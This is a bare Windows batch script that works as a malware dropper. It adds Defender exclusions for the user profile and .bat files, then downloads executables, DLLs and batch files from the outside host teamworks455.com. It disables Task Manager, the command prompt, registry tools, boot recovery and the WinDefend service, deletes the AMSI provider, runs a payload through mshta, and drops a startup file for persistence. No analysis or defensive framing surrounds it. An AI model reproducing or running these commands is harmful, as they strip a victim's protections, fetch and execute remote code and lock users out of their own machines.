cd %APPDATA%
cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\AppData\Roaming'
cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\AppData\Roaming\'
cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\AppData\Roaming*'
cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\*'
cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '%USERPROFILE%'
cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\'
powershell Invoke-WebRequest https://teamworks455.com/_country/check.php -OutFile 9092.dll
powershell Invoke-WebRequest https://teamworks455.com/adminpriv.exe -OutFile adminpriv.exe
powershell Invoke-WebRequest https://teamworks455.com/appContast.dll -OutFile appContast.dll
powershell Invoke-WebRequest https://teamworks455.com/reboot.dll -OutFile reboot.dll
powershell Invoke-WebRequest https://teamworks455.com/new1.bat -OutFile new1.bat
powershell Invoke-WebRequest https://teamworks455.com/new2.bat -OutFile new2.bat
adminpriv -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
 
adminpriv -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f

adminpriv -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d "1" /f

adminpriv -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f

adminpriv -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f

powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""

adminpriv -U:T -ShowWindowMode:Hide bcdedit /set {default} recoveryenabled No

adminpriv -U:T -ShowWindowMode:Hide bcdedit /set {default} bootstatuspolicy ignoreallfailures
adminpriv -U:T sc config WinDefend start= disabled
powershell Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
start /b cmd /c C:\Windows\System32\mshta.exe %APPDATA%\appContast.dll
cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
powershell Invoke-WebRequest https://teamworks455.com/auto.bat -OutFile auto.bat